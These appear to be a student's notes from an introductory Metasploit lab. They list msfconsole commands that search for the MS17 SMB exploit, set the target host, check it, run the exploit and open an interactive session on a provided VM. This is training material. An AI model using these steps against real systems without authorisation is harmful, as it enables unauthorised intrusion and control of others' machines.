# Activity performed as part of Metasploit: Introduction

- **Pre-requisite** :
Start both Attack machine and the VM provided as part the room.

- **Msf Console** :
1. Use the search command: "search <necessary_string/module/exploit>". To get the different modules avaiable in the specified name.
2. Use the info command: "info <Provided_module>". To get the description on the module.

- **Working with modules** :
Inorder get better at using the metasplot framework. Used the target to exploit the MS17 vulnerability available on the system.
1. Use the Search option usring the command: "search <ms17>".
2. Use the command use to set the context and further proceed. command: "use <result_no/full_path>".
3. Use show options command to view the necessary parameters that need to be set. command:"show options".
4. Use unset all command to unset previously set parameter values. command:"unset all"
5. Use the setg command to set the global parameters. In this intance the target, command: "setg RHOSTS=<Target_IP>".
6. Use back command to navigate back to msf console view.
7. Use the use command to set the context and proceed further. command: "use <fullpath>". Upon using this the payload gets configured for the Target IP.
8. Use show options to view the options available.
9. Use the check command to check if the target is vulnerable to the payload configured. command:"check"
10. Use the exploit command to exploit the vulnerability on the target. command: "exploit -z"
11. Use the sessions command to check on the sessions created. command:"sessions"
12. Use the sessions command with options to interact with the target machine terminal. command:"sessions -i <session_no>"
